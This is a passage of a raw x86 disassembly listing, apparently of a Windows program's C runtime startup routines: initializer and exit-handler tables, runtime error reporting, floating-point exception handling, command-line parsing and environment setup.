  424668:	pop    ecx
  424669:	ret    
  42466a:	push   0x8
  42466c:	call   0x42547b
  424671:	pop    ecx
  424672:	ret    
  424673:	mov    eax,ds:0x45e270
  424678:	test   eax,eax
  42467a:	je     0x42467e
  42467c:	call   eax
  42467e:	push   esi
  42467f:	push   edi
  424680:	mov    ecx,0x42b00c
  424685:	mov    edi,0x42b018
  42468a:	xor    eax,eax
  42468c:	cmp    ecx,edi
  42468e:	mov    esi,ecx
  424690:	jae    0x4246a9
  424692:	test   eax,eax
  424694:	jne    0x4246d5
  424696:	mov    ecx,DWORD PTR [esi]
  424698:	test   ecx,ecx
  42469a:	je     0x42469e
  42469c:	call   ecx
  42469e:	add    esi,0x4
  4246a1:	cmp    esi,edi
  4246a3:	jb     0x424692
  4246a5:	test   eax,eax
  4246a7:	jne    0x4246d5
  4246a9:	push   0x4251a1
  4246ae:	call   0x425620
  4246b3:	mov    esi,0x42b000
  4246b8:	mov    eax,esi
  4246ba:	mov    edi,0x42b008
  4246bf:	cmp    eax,edi
  4246c1:	pop    ecx
  4246c2:	jae    0x4246d3
  4246c4:	mov    eax,DWORD PTR [esi]
  4246c6:	test   eax,eax
  4246c8:	je     0x4246cc
  4246ca:	call   eax
  4246cc:	add    esi,0x4
  4246cf:	cmp    esi,edi
  4246d1:	jb     0x4246c4
  4246d3:	xor    eax,eax
  4246d5:	pop    edi
  4246d6:	pop    esi
  4246d7:	ret    
  4246d8:	push   ebp
  4246d9:	mov    ebp,esp
  4246db:	push   esi
  4246dc:	push   edi
  4246dd:	push   0x8
  4246df:	call   0x42550f
  4246e4:	xor    esi,esi
  4246e6:	inc    esi
  4246e7:	cmp    DWORD PTR ds:0x45db04,esi
  4246ed:	pop    ecx
  4246ee:	jne    0x424700
  4246f0:	push   DWORD PTR [ebp+0x8]
  4246f3:	call   DWORD PTR ds:0x429064
  4246f9:	push   eax
  4246fa:	call   DWORD PTR ds:0x429060
  424700:	cmp    DWORD PTR [ebp+0xc],0x0
  424704:	mov    al,BYTE PTR [ebp+0x10]
  424707:	mov    DWORD PTR ds:0x45db00,esi
  42470d:	mov    ds:0x45dafc,al
  424712:	jne    0x424766
  424714:	mov    ecx,DWORD PTR ds:0x45e268
  42471a:	test   ecx,ecx
  42471c:	je     0x424747
  42471e:	mov    eax,ds:0x45e264
  424723:	sub    eax,0x4
  424726:	cmp    eax,ecx
  424728:	jmp    0x424740
  42472a:	mov    eax,DWORD PTR [eax]
  42472c:	test   eax,eax
  42472e:	je     0x424732
  424730:	call   eax
  424732:	mov    eax,ds:0x45e264
  424737:	sub    eax,0x4
  42473a:	cmp    eax,DWORD PTR ds:0x45e268
  424740:	mov    ds:0x45e264,eax
  424745:	jae    0x42472a
  424747:	mov    eax,0x42b01c
  42474c:	mov    esi,0x42b020
  424751:	cmp    eax,esi
  424753:	mov    edi,eax
  424755:	jae    0x424766
  424757:	mov    eax,DWORD PTR [edi]
  424759:	test   eax,eax
  42475b:	je     0x42475f
  42475d:	call   eax
  42475f:	add    edi,0x4
  424762:	cmp    edi,esi
  424764:	jb     0x424757
  424766:	mov    eax,0x42b024
  42476b:	mov    esi,0x42b028
  424770:	cmp    eax,esi
  424772:	mov    edi,eax
  424774:	jae    0x424785
  424776:	mov    eax,DWORD PTR [edi]
  424778:	test   eax,eax
  42477a:	je     0x42477e
  42477c:	call   eax
  42477e:	add    edi,0x4
  424781:	cmp    edi,esi
  424783:	jb     0x424776
  424785:	cmp    DWORD PTR [ebp+0x10],0x0
  424789:	pop    edi
  42478a:	pop    esi
  42478b:	je     0x424796
  42478d:	push   0x8
  42478f:	call   0x42547b
  424794:	jmp    0x4247a8
  424796:	push   DWORD PTR [ebp+0x8]
  424799:	mov    DWORD PTR ds:0x45db04,0x1
  4247a3:	call   0x424631
  4247a8:	pop    ecx
  4247a9:	pop    ebp
  4247aa:	ret    
  4247ab:	push   0x0
  4247ad:	push   0x0
  4247af:	push   DWORD PTR [esp+0xc]
  4247b3:	call   0x4246d8
  4247b8:	add    esp,0xc
  4247bb:	ret    
  4247bc:	push   0x0
  4247be:	push   0x1
  4247c0:	push   DWORD PTR [esp+0xc]
  4247c4:	call   0x4246d8
  4247c9:	add    esp,0xc
  4247cc:	ret    
  4247cd:	push   0x1
  4247cf:	push   0x0
  4247d1:	push   0x0
  4247d3:	call   0x4246d8
  4247d8:	add    esp,0xc
  4247db:	ret    
  4247dc:	push   0x1
  4247de:	push   0x1
  4247e0:	push   0x0
  4247e2:	call   0x4246d8
  4247e7:	add    esp,0xc
  4247ea:	ret    
  4247eb:	push   ebp
  4247ec:	mov    ebp,esp
  4247ee:	sub    esp,0x10c
  4247f4:	mov    eax,ds:0x45d430
  4247f9:	xor    eax,DWORD PTR [ebp+0x4]
  4247fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4247ff:	push   ebx
  424800:	push   esi
  424801:	mov    DWORD PTR [ebp-0x4],eax
  424804:	xor    edx,edx
  424806:	push   edi
  424807:	xor    eax,eax
  424809:	cmp    ecx,DWORD PTR [eax*8+0x45d1c8]
  424810:	je     0x424818
  424812:	inc    eax
  424813:	cmp    eax,0x12
  424816:	jb     0x424809
  424818:	mov    esi,eax
  42481a:	shl    esi,0x3
  42481d:	cmp    ecx,DWORD PTR [esi+0x45d1c8]
  424823:	jne    0x42494c
  424829:	mov    eax,ds:0x45dabc
  42482e:	cmp    eax,0x1
  424831:	je     0x424927
  424837:	cmp    eax,edx
  424839:	jne    0x424848
  42483b:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424842:	je     0x424927
  424848:	cmp    ecx,0xfc
  42484e:	je     0x42494c
  424854:	push   0x104
  424859:	lea    eax,[ebp-0x10c]
  42485f:	push   eax
  424860:	push   edx
  424861:	mov    BYTE PTR [ebp-0x8],dl
  424864:	call   DWORD PTR ds:0x42906c
  42486a:	test   eax,eax
  42486c:	jne    0x424881
  42486e:	lea    eax,[ebp-0x10c]
  424874:	push   0x42959c
  424879:	push   eax
  42487a:	call   0x425730
  42487f:	pop    ecx
  424880:	pop    ecx
  424881:	lea    eax,[ebp-0x10c]
  424887:	push   eax
  424888:	lea    edi,[ebp-0x10c]
  42488e:	call   0x425960
  424893:	inc    eax
  424894:	cmp    eax,0x3c
  424897:	pop    ecx
  424898:	jbe    0x4248c3
  42489a:	lea    eax,[ebp-0x10c]
  4248a0:	push   eax
  4248a1:	call   0x425960
  4248a6:	mov    edi,eax
  4248a8:	lea    eax,[ebp-0x10c]
  4248ae:	sub    eax,0x3b
  4248b1:	push   0x3
  4248b3:	add    edi,eax
  4248b5:	push   0x429598
  4248ba:	push   edi
  4248bb:	call   0x425830
  4248c0:	add    esp,0x10
  4248c3:	push   edi
  4248c4:	call   0x425960
  4248c9:	push   DWORD PTR [esi+0x45d1cc]
  4248cf:	mov    ebx,eax
  4248d1:	call   0x425960
  4248d6:	lea    eax,[ebx+eax*1+0x1c]
  4248da:	pop    ecx
  4248db:	add    eax,0x3
  4248de:	pop    ecx
  4248df:	and    eax,0xfffffffc
  4248e2:	call   0x4253a0
  4248e7:	mov    ebx,esp
  4248e9:	push   0x42957c
  4248ee:	push   ebx
  4248ef:	call   0x425730
  4248f4:	push   edi
  4248f5:	push   ebx
  4248f6:	call   0x425740
  4248fb:	push   0x429578
  424900:	push   ebx
  424901:	call   0x425740
  424906:	push   DWORD PTR [esi+0x45d1cc]
  42490c:	push   ebx
  42490d:	call   0x425740
  424912:	push   0x12010
  424917:	push   0x429550
  42491c:	push   ebx
  42491d:	call   0x425632
  424922:	add    esp,0x2c
  424925:	jmp    0x42494c
  424927:	push   edx
  424928:	lea    eax,[ebp+0x8]
  42492b:	push   eax
  42492c:	lea    esi,[esi+0x45d1cc]
  424932:	push   DWORD PTR [esi]
  424934:	call   0x425960
  424939:	pop    ecx
  42493a:	push   eax
  42493b:	push   DWORD PTR [esi]
  42493d:	push   0xfffffff4
  42493f:	call   DWORD PTR ds:0x429068
  424945:	push   eax
  424946:	call   DWORD PTR ds:0x42902c
  42494c:	lea    esp,[ebp-0x118]
  424952:	mov    ecx,DWORD PTR [ebp-0x4]
  424955:	xor    ecx,DWORD PTR [ebp+0x4]
  424958:	call   0x425a1c
  42495d:	pop    edi
  42495e:	pop    esi
  42495f:	pop    ebx
  424960:	leave  
  424961:	ret    
  424962:	mov    eax,ds:0x45dabc
  424967:	cmp    eax,0x1
  42496a:	je     0x424979
  42496c:	test   eax,eax
  42496e:	jne    0x42499a
  424970:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424977:	jne    0x42499a
  424979:	push   0xfc
  42497e:	call   0x4247eb
  424983:	mov    eax,ds:0x45db08
  424988:	test   eax,eax
  42498a:	pop    ecx
  42498b:	je     0x42498f
  42498d:	call   eax
  42498f:	push   0xff
  424994:	call   0x4247eb
  424999:	pop    ecx
  42499a:	ret    
  42499b:	push   ebp
  42499c:	mov    ebp,esp
  42499e:	push   ecx
  42499f:	push   ebx
  4249a0:	push   esi
  4249a1:	push   edi
  4249a2:	call   0x425203
  4249a7:	mov    edi,DWORD PTR [ebp+0x8]
  4249aa:	mov    esi,eax
  4249ac:	mov    edx,DWORD PTR [esi+0x54]
  4249af:	mov    eax,ds:0x45d2dc
  4249b4:	mov    ecx,edx
  4249b6:	cmp    DWORD PTR [ecx],edi
  4249b8:	je     0x4249c7
  4249ba:	lea    ebx,[eax+eax*2]
  4249bd:	add    ecx,0xc
  4249c0:	lea    ebx,[edx+ebx*4]
  4249c3:	cmp    ecx,ebx
  4249c5:	jb     0x4249b6
  4249c7:	lea    eax,[eax+eax*2]
  4249ca:	lea    eax,[edx+eax*4]
  4249cd:	cmp    ecx,eax
  4249cf:	jae    0x4249d5
  4249d1:	cmp    DWORD PTR [ecx],edi
  4249d3:	je     0x4249d7
  4249d5:	xor    ecx,ecx
  4249d7:	test   ecx,ecx
  4249d9:	je     0x424af1
  4249df:	mov    ebx,DWORD PTR [ecx+0x8]
  4249e2:	test   ebx,ebx
  4249e4:	mov    DWORD PTR [ebp+0x8],ebx
  4249e7:	je     0x424af1
  4249ed:	cmp    ebx,0x5
  4249f0:	jne    0x4249fe
  4249f2:	and    DWORD PTR [ecx+0x8],0x0
  4249f6:	xor    eax,eax
  4249f8:	inc    eax
  4249f9:	jmp    0x424afa
  4249fe:	cmp    ebx,0x1
  424a01:	je     0x424aec
  424a07:	mov    eax,DWORD PTR [esi+0x58]
  424a0a:	mov    DWORD PTR [ebp-0x4],eax
  424a0d:	mov    eax,DWORD PTR [ebp+0xc]
  424a10:	mov    DWORD PTR [esi+0x58],eax
  424a13:	mov    eax,DWORD PTR [ecx+0x4]
  424a16:	cmp    eax,0x8
  424a19:	jne    0x424ade
  424a1f:	mov    edx,DWORD PTR ds:0x45d2d0
  424a25:	mov    eax,ds:0x45d2d4
  424a2a:	add    eax,edx
  424a2c:	cmp    edx,eax
  424a2e:	jge    0x424a57
  424a30:	lea    eax,[edx+edx*2]
  424a33:	shl    eax,0x2
  424a36:	mov    edi,DWORD PTR [esi+0x54]
  424a39:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424a3e:	mov    edi,DWORD PTR ds:0x45d2d0
  424a44:	mov    ebx,DWORD PTR ds:0x45d2d4
  424a4a:	inc    edx
  424a4b:	add    ebx,edi
  424a4d:	add    eax,0xc
  424a50:	cmp    edx,ebx
  424a52:	jl     0x424a36
  424a54:	mov    ebx,DWORD PTR [ebp+0x8]
  424a57:	mov    ecx,DWORD PTR [ecx]
  424a59:	cmp    ecx,0xc000008e
  424a5f:	mov    edi,DWORD PTR [esi+0x5c]
  424a62:	jne    0x424a6d
  424a64:	mov    DWORD PTR [esi+0x5c],0x83
  424a6b:	jmp    0x424ad1
  424a6d:	cmp    ecx,0xc0000090
  424a73:	jne    0x424a7e
  424a75:	mov    DWORD PTR [esi+0x5c],0x81
  424a7c:	jmp    0x424ad1
  424a7e:	cmp    ecx,0xc0000091
  424a84:	jne    0x424a8f
  424a86:	mov    DWORD PTR [esi+0x5c],0x84
  424a8d:	jmp    0x424ad1
  424a8f:	cmp    ecx,0xc0000093
  424a95:	jne    0x424aa0
  424a97:	mov    DWORD PTR [esi+0x5c],0x85
  424a9e:	jmp    0x424ad1
  424aa0:	cmp    ecx,0xc000008d
  424aa6:	jne    0x424ab1
  424aa8:	mov    DWORD PTR [esi+0x5c],0x82
  424aaf:	jmp    0x424ad1
  424ab1:	cmp    ecx,0xc000008f
  424ab7:	jne    0x424ac2
  424ab9:	mov    DWORD PTR [esi+0x5c],0x86
  424ac0:	jmp    0x424ad1
  424ac2:	cmp    ecx,0xc0000092
  424ac8:	jne    0x424ad1
  424aca:	mov    DWORD PTR [esi+0x5c],0x8a
  424ad1:	push   DWORD PTR [esi+0x5c]
  424ad4:	push   0x8
  424ad6:	call   ebx
  424ad8:	pop    ecx
  424ad9:	mov    DWORD PTR [esi+0x5c],edi
  424adc:	jmp    0x424ae5
  424ade:	and    DWORD PTR [ecx+0x8],0x0
  424ae2:	push   eax
  424ae3:	call   ebx
  424ae5:	mov    eax,DWORD PTR [ebp-0x4]
  424ae8:	pop    ecx
  424ae9:	mov    DWORD PTR [esi+0x58],eax
  424aec:	or     eax,0xffffffff
  424aef:	jmp    0x424afa
  424af1:	push   DWORD PTR [ebp+0xc]
  424af4:	call   DWORD PTR ds:0x429070
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	pop    ebx
  424afd:	leave  
  424afe:	ret    
  424aff:	cmp    DWORD PTR ds:0x45e26c,0x0
  424b06:	jne    0x424b0d
  424b08:	call   0x425f3c
  424b0d:	push   esi
  424b0e:	mov    esi,DWORD PTR ds:0x45e274
  424b14:	test   esi,esi
  424b16:	jne    0x424b1f
  424b18:	mov    esi,0x4295b3
  424b1d:	jmp    0x424b64
  424b1f:	mov    al,BYTE PTR [esi]
  424b21:	cmp    al,0x22
  424b23:	jne    0x424b4d
  424b25:	inc    esi
  424b26:	mov    al,BYTE PTR [esi]
  424b28:	cmp    al,0x22
  424b2a:	je     0x424b5d
  424b2c:	test   al,al
  424b2e:	je     0x424b46
  424b30:	movzx  eax,al
  424b33:	push   eax
  424b34:	call   0x425a5b
  424b39:	test   eax,eax
  424b3b:	pop    ecx
  424b3c:	je     0x424b3f
  424b3e:	inc    esi
  424b3f:	inc    esi
  424b40:	mov    al,BYTE PTR [esi]
  424b42:	cmp    al,0x22
  424b44:	jne    0x424b2c
  424b46:	cmp    BYTE PTR [esi],0x22
  424b49:	jne    0x424b5e
  424b4b:	jmp    0x424b5d
  424b4d:	cmp    al,0x20
  424b4f:	jbe    0x424b5e
  424b51:	inc    esi
  424b52:	cmp    BYTE PTR [esi],0x20
  424b55:	ja     0x424b51
  424b57:	jmp    0x424b5e
  424b59:	cmp    al,0x20
  424b5b:	ja     0x424b64
  424b5d:	inc    esi
  424b5e:	mov    al,BYTE PTR [esi]
  424b60:	test   al,al
  424b62:	jne    0x424b59
  424b64:	mov    eax,esi
  424b66:	pop    esi
  424b67:	ret    
  424b68:	push   ebx
  424b69:	xor    ebx,ebx
  424b6b:	cmp    DWORD PTR ds:0x45e26c,ebx
  424b71:	push   esi
  424b72:	push   edi
  424b73:	jne    0x424b7a
  424b75:	call   0x425f3c
  424b7a:	mov    esi,DWORD PTR ds:0x45dab4
  424b80:	xor    edi,edi
  424b82:	cmp    esi,ebx
  424b84:	jne    0x424b98
  424b86:	jmp    0x424bb8
  424b88:	cmp    al,0x3d
  424b8a:	je     0x424b8d
  424b8c:	inc    edi
  424b8d:	push   esi
  424b8e:	call   0x425960
  424b93:	pop    ecx
  424b94:	lea    esi,[esi+eax*1+0x1]
  424b98:	mov    al,BYTE PTR [esi]
  424b9a:	cmp    al,bl
  424b9c:	jne    0x424b88
  424b9e:	lea    eax,[edi*4+0x4]
  424ba5:	push   eax
  424ba6:	call   0x426072
  424bab:	mov    edi,eax
  424bad:	cmp    edi,ebx
  424baf:	pop    ecx
  424bb0:	mov    DWORD PTR ds:0x45dae4,edi
  424bb6:	jne    0x424bbd
  424bb8:	or     eax,0xffffffff
  424bbb:	jmp    0x424c15
  424bbd:	mov    esi,DWORD PTR ds:0x45dab4
  424bc3:	push   ebp
  424bc4:	jmp    0x424bf0
  424bc6:	push   esi
  424bc7:	call   0x425960
  424bcc:	mov    ebp,eax
  424bce:	inc    ebp
  424bcf:	cmp    BYTE PTR [esi],0x3d
  424bd2:	pop    ecx
  424bd3:	je     0x424bee
  424bd5:	push   ebp
  424bd6:	call   0x426072
  424bdb:	cmp    eax,ebx
  424bdd:	pop    ecx
  424bde:	mov    DWORD PTR [edi],eax
  424be0:	je     0x424c19
  424be2:	push   esi
  424be3:	push   eax
  424be4:	call   0x425730
  424be9:	pop    ecx
  424bea:	pop    ecx
  424beb:	add    edi,0x4
  424bee:	add    esi,ebp
  424bf0:	cmp    BYTE PTR [esi],bl
  424bf2:	jne    0x424bc6
  424bf4:	push   DWORD PTR ds:0x45dab4
  424bfa:	call   0x425f5a
  424bff:	mov    DWORD PTR ds:0x45dab4,ebx
  424c05:	mov    DWORD PTR [edi],ebx
  424c07:	mov    DWORD PTR ds:0x45e260,0x1
  424c11:	xor    eax,eax
  424c13:	pop    ecx
  424c14:	pop    ebp
  424c15:	pop    edi
  424c16:	pop    esi
  424c17:	pop    ebx
  424c18:	ret    
  424c19:	push   DWORD PTR ds:0x45dae4
  424c1f:	call   0x425f5a
  424c24:	mov    DWORD PTR ds:0x45dae4,ebx
  424c2a:	or     eax,0xffffffff
  424c2d:	jmp    0x424c13
  424c2f:	push   ebp
  424c30:	mov    ebp,esp
  424c32:	push   ecx
  424c33:	push   ebx
  424c34:	mov    ebx,DWORD PTR [ebp+0xc]
  424c37:	xor    edx,edx
  424c39:	cmp    DWORD PTR [ebp+0x8],edx
  424c3c:	push   edi
  424c3d:	mov    DWORD PTR [esi],edx
  424c3f:	mov    edi,ecx
  424c41:	mov    DWORD PTR [ebx],0x1
  424c47:	je     0x424c52
  424c49:	mov    ecx,DWORD PTR [ebp+0x8]
  424c4c:	add    DWORD PTR [ebp+0x8],0x4
  424c50:	mov    DWORD PTR [ecx],edi
  424c52:	cmp    BYTE PTR [eax],0x22
  424c55:	jne    0x424c65
  424c57:	xor    ecx,ecx
  424c59:	test   edx,edx
  424c5b:	sete   cl
  424c5e:	inc    eax
  424c5f:	mov    edx,ecx
  424c61:	mov    cl,0x22
  424c63:	jmp    0x424c92
  424c65:	inc    DWORD PTR [esi]
  424c67:	test   edi,edi
  424c69:	je     0x424c70
  424c6b:	mov    cl,BYTE PTR [eax]
  424c6d:	mov    BYTE PTR [edi],cl
  424c6f:	inc    edi
  424c70:	mov    cl,BYTE PTR [eax]
  424c72:	movzx  ebx,cl
  424c75:	inc    eax
  424c76:	test   BYTE PTR [ebx+0x45df21],0x4
  424c7d:	je     0x424c8b
  424c7f:	inc    DWORD PTR [esi]
  424c81:	test   edi,edi
  424c83:	je     0x424c8a
  424c85:	mov    bl,BYTE PTR [eax]
  424c87:	mov    BYTE PTR [edi],bl
  424c89:	inc    edi
  424c8a:	inc    eax
  424c8b:	test   cl,cl
  424c8d:	mov    ebx,DWORD PTR [ebp+0xc]
  424c90:	je     0x424cc4
  424c92:	test   edx,edx
  424c94:	jne    0x424c52
  424c96:	cmp    cl,0x20
  424c99:	je     0x424ca0
  424c9b:	cmp    cl,0x9
  424c9e:	jne    0x424c52
  424ca0:	test   edi,edi
  424ca2:	je     0x424ca8
  424ca4:	and    BYTE PTR [edi-0x1],0x0
  424ca8:	and    DWORD PTR [ebp-0x4],0x0
  424cac:	cmp    BYTE PTR [eax],0x0
  424caf:	je     0x424d8b
  424cb5:	mov    cl,BYTE PTR [eax]
  424cb7:	cmp    cl,0x20
  424cba:	je     0x424cc1
  424cbc:	cmp    cl,0x9
  424cbf:	jne    0x424cc7
  424cc1:	inc    eax
  424cc2:	jmp    0x424cb5
  424cc4:	dec    eax
  424cc5:	jmp    0x424ca8
  424cc7:	cmp    BYTE PTR [eax],0x0
  424cca:	je     0x424d8b
  424cd0:	cmp    DWORD PTR [ebp+0x8],0x0
  424cd4:	je     0x424cdf
  424cd6:	mov    ecx,DWORD PTR [ebp+0x8]
  424cd9:	add    DWORD PTR [ebp+0x8],0x4
  424cdd:	mov    DWORD PTR [ecx],edi
  424cdf:	inc    DWORD PTR [ebx]
  424ce1:	xor    ebx,ebx
  424ce3:	inc    ebx
  424ce4:	xor    edx,edx
  424ce6:	jmp    0x424cea
  424ce8:	inc    eax
  424ce9:	inc    edx
  424cea:	cmp    BYTE PTR [eax],0x5c
  424ced:	je     0x424ce8
  424cef:	cmp    BYTE PTR [eax],0x22
  424cf2:	jne    0x424d1a
  424cf4:	test   dl,0x1
  424cf7:	jne    0x424d18
  424cf9:	cmp    DWORD PTR [ebp-0x4],0x0
  424cfd:	je     0x424d0b
  424cff:	lea    ecx,[eax+0x1]
  424d02:	cmp    BYTE PTR [ecx],0x22
  424d05:	jne    0x424d0b
  424d07:	mov    eax,ecx
  424d09:	jmp    0x424d0d
  424d0b:	xor    ebx,ebx
  424d0d:	xor    ecx,ecx
  424d0f:	cmp    DWORD PTR [ebp-0x4],ecx
  424d12:	sete   cl
  424d15:	mov    DWORD PTR [ebp-0x4],ecx
  424d18:	shr    edx,1
  424d1a:	test   edx,edx
  424d1c:	je     0x424d2b
  424d1e:	test   edi,edi
  424d20:	je     0x424d26
  424d22:	mov    BYTE PTR [edi],0x5c
  424d25:	inc    edi
  424d26:	inc    DWORD PTR [esi]
  424d28:	dec    edx
  424d29:	jne    0x424d1e
  424d2b:	mov    cl,BYTE PTR [eax]
  424d2d:	test   cl,cl
  424d2f:	je     0x424d79
  424d31:	cmp    DWORD PTR [ebp-0x4],0x0
  424d35:	jne    0x424d41
  424d37:	cmp    cl,0x20
  424d3a:	je     0x424d79
  424d3c:	cmp    cl,0x9
  424d3f:	je     0x424d79
  424d41:	test   ebx,ebx
  424d43:	je     0x424d73
  424d45:	test   edi,edi
  424d47:	je     0x424d62
  424d49:	movzx  edx,cl
  424d4c:	test   BYTE PTR [edx+0x45df21],0x4
  424d53:	je     0x424d5b
  424d55:	mov    BYTE PTR [edi],cl
  424d57:	inc    edi
  424d58:	inc    eax
  424d59:	inc    DWORD PTR [esi]
  424d5b:	mov    cl,BYTE PTR [eax]
  424d5d:	mov    BYTE PTR [edi],cl
  424d5f:	inc    edi
  424d60:	jmp    0x424d71
  424d62:	movzx  ecx,cl
  424d65:	test   BYTE PTR [ecx+0x45df21],0x4
  424d6c:	je     0x424d71
  424d6e:	inc    eax
  424d6f:	inc    DWORD PTR [esi]
  424d71:	inc    DWORD PTR [esi]
  424d73:	inc    eax
  424d74:	jmp    0x424ce1
  424d79:	test   edi,edi
  424d7b:	je     0x424d81
  424d7d:	and    BYTE PTR [edi],0x0
  424d80:	inc    edi
  424d81:	inc    DWORD PTR [esi]
  424d83:	mov    ebx,DWORD PTR [ebp+0xc]
  424d86:	jmp    0x424cac
  424d8b:	mov    eax,DWORD PTR [ebp+0x8]
  424d8e:	test   eax,eax
  424d90:	je     0x424d95
  424d92:	and    DWORD PTR [eax],0x0
  424d95:	inc    DWORD PTR [ebx]
  424d97:	pop    edi
  424d98:	pop    ebx
  424d99:	leave  
  424d9a:	ret    
  424d9b:	push   ebp
  424d9c:	mov    ebp,esp
  424d9e:	push   ecx
  424d9f:	push   ecx
  424da0:	push   ebx
  424da1:	push   esi
  424da2:	push   edi
  424da3:	xor    edi,edi
  424da5:	cmp    DWORD PTR ds:0x45e26c,edi
  424dab:	jne    0x424db2
  424dad:	call   0x425f3c
  424db2:	and    BYTE PTR ds:0x45dc14,0x0
  424db9:	push   0x104
  424dbe:	mov    esi,0x45db10
  424dc3:	push   esi
  424dc4:	push   edi
  424dc5:	call   DWORD PTR ds:0x42906c
  424dcb:	mov    eax,ds:0x45e274
  424dd0:	cmp    eax,edi
  424dd2:	mov    DWORD PTR ds:0x45daf4,esi
  424dd8:	je     0x424de1
  424dda:	cmp    BYTE PTR [eax],0x0
  424ddd:	mov    ebx,eax
  424ddf:	jne    0x424de3
  424de1:	mov    ebx,esi
  424de3:	lea    eax,[ebp-0x4]
  424de6:	push   eax
  424de7:	push   edi
  424de8:	lea    esi,[ebp-0x8]
  424deb:	xor    ecx,ecx
  424ded:	mov    eax,ebx
  424def:	call   0x424c2f
  424df4:	mov    esi,DWORD PTR [ebp-0x4]
  424df7:	mov    eax,DWORD PTR [ebp-0x8]
  424dfa:	shl    esi,0x2
  424dfd:	add    eax,esi
  424dff:	push   eax
  424e00:	call   0x426072
  424e05:	mov    edi,eax
  424e07:	add    esp,0xc
  424e0a:	test   edi,edi
  424e0c:	jne    0x424e13
  424e0e:	or     eax,0xffffffff
  424e11:	jmp    0x424e38
  424e13:	lea    eax,[ebp-0x4]
  424e16:	push   eax
  424e17:	lea    ecx,[esi+edi*1]
  424e1a:	push   edi
  424e1b:	lea    esi,[ebp-0x8]
  424e1e:	mov    eax,ebx
  424e20:	call   0x424c2f
  424e25:	mov    eax,DWORD PTR [ebp-0x4]
  424e28:	dec    eax
  424e29:	pop    ecx
  424e2a:	mov    ds:0x45dad8,eax
  424e2f:	pop    ecx
  424e30:	mov    DWORD PTR ds:0x45dadc,edi
  424e36:	xor    eax,eax
  424e38:	pop    edi
  424e39:	pop    esi
  424e3a:	pop    ebx
  424e3b:	leave  
  424e3c:	ret    
  424e3d:	push   ecx
  424e3e:	push   ecx
  424e3f:	mov    eax,ds:0x45dc18
  424e44:	push   ebx
  424e45:	push   ebp
  424e46:	push   esi
  424e47:	push   edi
  424e48:	mov    edi,DWORD PTR ds:0x429084
  424e4e:	xor    ebx,ebx
  424e50:	xor    esi,esi
  424e52:	cmp    eax,ebx
  424e54:	push   0x2
  424e56:	pop    ebp
  424e57:	jne    0x424e86
  424e59:	call   edi
  424e5b:	mov    esi,eax
  424e5d:	cmp    esi,ebx
  424e5f:	je     0x424e6d
  424e61:	mov    DWORD PTR ds:0x45dc18,0x1
  424e6b:	jmp    0x424e8b
  424e6d:	call   DWORD PTR ds:0x429028
  424e73:	cmp    eax,0x78
  424e76:	jne    0x424e81
  424e78:	mov    eax,ebp
  424e7a:	mov    ds:0x45dc18,eax
  424e7f:	jmp    0x424e86
  424e81:	mov    eax,ds:0x45dc18
  424e86:	cmp    eax,0x1
  424e89:	jne    0x424f08
  424e8b:	cmp    esi,ebx
  424e8d:	jne    0x424e97
  424e8f:	call   edi
  424e91:	mov    esi,eax
  424e93:	cmp    esi,ebx
  424e95:	je     0x424f10
  424e97:	cmp    WORD PTR [esi],bx
  424e9a:	mov    eax,esi
  424e9c:	je     0x424eac
  424e9e:	add    eax,ebp
  424ea0:	cmp    WORD PTR [eax],bx
  424ea3:	jne    0x424e9e
  424ea5:	add    eax,ebp
  424ea7:	cmp    WORD PTR [eax],bx
  424eaa:	jne    0x424e9e
  424eac:	mov    edi,DWORD PTR ds:0x429080
  424eb2:	push   ebx
  424eb3:	push   ebx
  424eb4:	push   ebx
  424eb5:	sub    eax,esi
  424eb7:	push   ebx
  424eb8:	sar    eax,1
  424eba:	inc    eax
  424ebb:	push   eax
  424ebc:	push   esi
  424ebd:	push   ebx
  424ebe:	push   ebx
  424ebf:	mov    DWORD PTR [esp+0x34],eax
  424ec3:	call   edi
  424ec5:	mov    ebp,eax
  424ec7:	cmp    ebp,ebx
  424ec9:	je     0x424efd
  424ecb:	push   ebp
  424ecc:	call   0x426072
  424ed1:	cmp    eax,ebx
  424ed3:	pop    ecx
  424ed4:	mov    DWORD PTR [esp+0x10],eax
  424ed8:	je     0x424efd
  424eda:	push   ebx
  424edb:	push   ebx
  424edc:	push   ebp
  424edd:	push   eax
  424ede:	push   DWORD PTR [esp+0x24]
  424ee2:	push   esi
  424ee3:	push   ebx
  424ee4:	push   ebx
  424ee5:	call   edi
  424ee7:	test   eax,eax
  424ee9:	jne    0x424ef9
  424eeb:	push   DWORD PTR [esp+0x10]
  424eef:	call   0x425f5a
  424ef4:	pop    ecx
  424ef5:	mov    DWORD PTR [esp+0x10],ebx
  424ef9:	mov    ebx,DWORD PTR [esp+0x10]
  424efd:	push   esi
  424efe:	call   DWORD PTR ds:0x42907c
  424f04:	mov    eax,ebx
  424f06:	jmp    0x424f58
  424f08:	cmp    eax,ebp
  424f0a:	je     0x424f14
  424f0c:	cmp    eax,ebx
  424f0e:	je     0x424f14
  424f10:	xor    eax,eax
  424f12:	jmp    0x424f58
  424f14:	call   DWORD PTR ds:0x429078
  424f1a:	mov    esi,eax
  424f1c:	cmp    esi,ebx
  424f1e:	je     0x424f10
  424f20:	cmp    BYTE PTR [esi],bl
  424f22:	je     0x424f2e
  424f24:	inc    eax
  424f25:	cmp    BYTE PTR [eax],bl
  424f27:	jne    0x424f24
  424f29:	inc    eax
  424f2a:	cmp    BYTE PTR [eax],bl
  424f2c:	jne    0x424f24
  424f2e:	sub    eax,esi
  424f30:	inc    eax
  424f31:	mov    ebp,eax
  424f33:	push   ebp
  424f34:	call   0x426072
  424f39:	mov    edi,eax
  424f3b:	cmp    edi,ebx
  424f3d:	pop    ecx
  424f3e:	jne    0x424f44
  424f40:	xor    edi,edi
  424f42:	jmp    0x424f4f
  424f44:	push   ebp
  424f45:	push   esi
  424f46:	push   edi
  424f47:	call   0x426090
  424f4c:	add    esp,0xc
  424f4f:	push   esi
  424f50:	call   DWORD PTR ds:0x429074
  424f56:	mov    eax,edi
  424f58:	pop    edi
  424f59:	pop    esi
  424f5a:	pop    ebp
  424f5b:	pop    ebx
  424f5c:	pop    ecx
  424f5d:	pop    ecx
  424f5e:	ret    
  424f5f:	sub    esp,0x48
  424f62:	push   ebx
  424f63:	mov    ebx,0x480
  424f68:	push   ebx
  424f69:	call   0x426072
